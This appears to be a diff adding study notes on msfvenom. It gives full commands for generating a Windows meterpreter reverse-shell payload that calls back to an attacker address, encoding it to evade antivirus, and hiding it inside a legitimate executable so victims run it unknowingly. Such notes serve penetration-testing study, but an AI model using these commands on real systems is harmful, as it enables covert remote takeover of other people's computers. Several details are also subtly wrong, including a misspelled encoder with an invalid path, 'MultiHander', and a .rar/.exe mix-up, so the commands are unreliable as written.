@@ -1,0 +1,38 @@
+### MSF Venom (Introduction)
+
+---
+
+##### Options
+
+> - a : architecture (x86) 
+> - p : Payload (Example : windows/x64/meterpreter/reverse_tcp)
+> - LHOST : Local IP
+> - LPORT : Local Port
+> - f : *format* (Example: exe, elf)
+>   
+>   *msfvenom --list formats*
+
+After generating the payload, we use MultiHander to establish the connection with the victim.
+
+---
+
+##### Encoding my payload
+
+In order to avoid various AV detection, we use encoding. Encoding aims to modify payload signature.
+
+`msfvenom --list Encoders`
+The most used : shakata_ga_nai
+
+`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=1234 *-e /x64/shakata_ga_nai* -f exe > payload.exe`
+
+we can also specify the iteration by adding the option *(i=10)* 
+
+---
+
+##### Injecting payload into Windows portable executable
+
+portable payload name : *myfile.rar*
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=1234 -e /x64/shakata_ga_nai -i 10 -f exe *-x /download/myfile.exe* > winrar.exe
+
+The generated payload will be similar to the legitime file myfile.rar but we will lose the function of the exe. In order to make the file run as usual, we can add the option *(-k)* . But it doesnt work for all portable executable.
